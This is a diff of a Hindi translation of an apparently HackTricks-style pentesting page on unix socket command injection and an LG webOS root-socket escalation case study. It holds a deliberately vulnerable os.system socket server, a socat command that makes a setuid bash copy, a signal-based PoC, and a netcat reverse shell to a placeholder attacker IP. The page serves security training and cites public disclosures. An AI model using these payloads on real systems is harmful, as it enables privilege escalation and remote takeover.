@@ -1,8 +1,10 @@
 # Socket Command Injection
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Python के साथ Socket binding का उदाहरण
 
-निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और जो कुछ भी **प्राप्त** होता है, उसे `os.system` द्वारा **execute** किया जाता है।मुझे पता है कि आपको ऐसा कोई उदाहरण वास्तविक दुनिया में नहीं मिलेगा, लेकिन इस उदाहरण का उद्देश्य यह देखना है कि unix sockets का उपयोग करने वाला code कैसा दिखता है और सबसे खराब स्थिति में input को कैसे manage किया जाए।
+निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और **प्राप्त होने वाली हर चीज़ को** `os.system` द्वारा **execute किया जाता है**।मुझे पता है कि आपको यह वास्तविक परिस्थितियों में नहीं मिलेगा, लेकिन इस उदाहरण का उद्देश्य यह देखना है कि unix sockets का उपयोग करने वाला code कैसा दिखता है और सबसे खराब स्थिति में input को कैसे manage किया जाता है।
 ```python:s.py
 import socket
 import os, os.path
@@ -24,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Execute** code using python: `python s.py` और **check how the socket is listening**:
+**कोड को** python का उपयोग करके `python s.py` **चलाएँ और जाँचें कि socket कैसे listening कर रहा है**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -35,20 +37,20 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## केस अध्ययन: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-कुछ privileged daemons एक root-owned UNIX socket expose करते हैं, जो untrusted input स्वीकार करता है और privileged actions को thread-IDs तथा signals से जोड़ता है। यदि protocol किसी unprivileged client को यह प्रभावित करने देता है कि किस native thread को target किया जाए, तो आप privileged code path trigger करके privilege escalate कर सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup>
+कुछ privileged daemons ऐसे root-owned UNIX socket expose करते हैं जो untrusted input स्वीकार करते हैं और privileged actions को thread-IDs तथा signals से जोड़ते हैं। यदि protocol किसी unprivileged client को यह प्रभावित करने देता है कि किस native thread को target किया जाए, तो आप privileged code path trigger करके privilege escalate कर सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup>
 
-Primary write-up और disclosure में निम्न sequence का वर्णन किया गया है।<sup>[[1]](#references)[[2]](#references)</sup>
+Primary write-up और disclosure में निम्न sequence बताया गया है।<sup>[[1]](#references)[[2]](#references)</sup>
 
-देखा गया pattern:
-- Root-owned socket (जैसे /tmp/remotelogger) से connect करें।
+Observed pattern:
+- किसी root-owned socket (जैसे /tmp/remotelogger) से connect करें।
 - एक thread बनाएँ और उसका native thread id (TID) प्राप्त करें।
-- TID (packed) और padding को request के रूप में भेजें; acknowledgement प्राप्त करें।
+- request के रूप में TID (packed) और padding भेजें; acknowledgement प्राप्त करें।
 - privileged behaviour trigger करने के लिए उस TID को एक specific signal भेजें।
 
 नीचे दिया गया condensed PoC उसी sequence को दर्शाता है।<sup>[[1]](#references)[[2]](#references)</sup>
-न्यूनतम PoC sketch:
+Minimal PoC sketch:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -65,11 +67,12 @@ os.kill(tid, 4)  # deliver SIGILL (example from the case)
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-- Bugs की यह class unprivileged client state (TIDs) से derived values पर trust करने और उन्हें privileged signal handlers या logic से bind करने के कारण उत्पन्न होती है।<sup>[[1]](#references)</sup>
-- Socket पर credentials enforce करके, message formats validate करके और privileged operations को externally supplied thread identifiers से decouple करके harden करें।
+नोट्स:
+- इस श्रेणी के bugs unprivileged client state (TIDs) से प्राप्त values पर भरोसा करने और उन्हें privileged signal handlers या logic से bind करने के कारण उत्पन्न होती है।<sup>[[1]](#references)</sup>
+- socket पर credentials लागू करके, message formats को validate करके और privileged operations को externally supplied thread identifiers से decouple करके harden करें।
 
 ## References
 
-- [1] [मज़े के लिए webOS को Jailbreak करना (सिर्फ़ मज़े के लिए)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [1] [मज़े के लिए webOS Jailbreak (सिर्फ मज़े के लिए)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
 - [2] [LG WebOS TV Path Traversal, Authentication Bypass और Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
